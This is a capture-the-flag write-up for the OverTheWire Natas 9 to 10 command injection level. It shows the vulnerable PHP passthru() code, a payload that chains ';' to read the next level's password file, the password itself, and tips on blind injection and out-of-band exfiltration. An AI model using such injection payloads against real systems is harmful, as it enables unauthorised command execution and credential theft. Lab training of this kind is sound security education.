# Natas9 → Natas10

**URL:** `http://natas9.natas.labs.overthewire.org`    
**Difficulty:** Easy  
**Category:** Command Injection

---

## Objective
Exploit the search functionality to read the Natas10 password from the server filesystem.

---

## Recon & Observations
- Page had a "Find words containing:" input box with a Submit button
- Checked source code via the "View sourcecode" link:
```php
$key = "";
if(array_key_exists("needle", $_REQUEST)) {
    $key = $_REQUEST["needle"];
}
if($key != "") {
    passthru("grep -i $key dictionary.txt");
}
```

- User input is inserted directly into a shell command with zero sanitization:
  `grep -i $key dictionary.txt`
- `passthru()` executes the command and prints raw output to the page
- Shell metacharacters like `;` are not stripped, allowing command chaining

---

## Vulnerability

**Type:** OS Command Injection  
**Root Cause:** User-supplied input (`$_REQUEST["needle"]`) is concatenated
directly into a shell command string passed to `passthru()` without any
sanitization or escaping. This allows an attacker to inject arbitrary shell
commands using metacharacters like `;`, `|`, `&&`, or backticks.

---

## Exploit

1. Identified that the `needle` parameter was being passed raw into `passthru()`
2. Crafted a payload using `;` to terminate the `grep` command and append
   a second command to read the password file:

**Payload entered into the input box:**

; cat /etc/natas_webpass/natas10 ;

**Resulting command executed on the server:**
```
grep -i ; cat /etc/natas_webpass/natas10 ; dictionary.txt
```

- The first `;` terminates the `grep` command (which errors silently)
- `cat /etc/natas_webpass/natas10` executes and prints the password
- The trailing `;` cleanly ignores `dictionary.txt` as a dangling argument

---

## Password Found
<details>
<summary> Reveal Password (Spoiler)</summary>
t7I5VHvpa14sJTUGV0cbEsbYfFP2dmOu
</details>

---

## Key Takeaways

- passthru(), exec(), system(), and shell_exec() in PHP are
extremely dangerous when they consume user input — always test these
with shell metacharacters: `;  |  &&  ||  $()  ``
- Command injection is one of the highest severity web vulnerabilities —
it gives direct OS-level access and is rated Critical on bug bounty platforms
- The fix here is to use escapeshellarg() or escapeshellcmd() to sanitize
input before passing it to shell functions, or better yet avoid shell
execution entirely and use native language functions (e.g. PHP's built-in
file search functions)
- In real bug bounty, blind command injection (no output on page) is more
common — use sleep 5 to confirm execution, then exfiltrate via DNS or
an out-of-band HTTP request
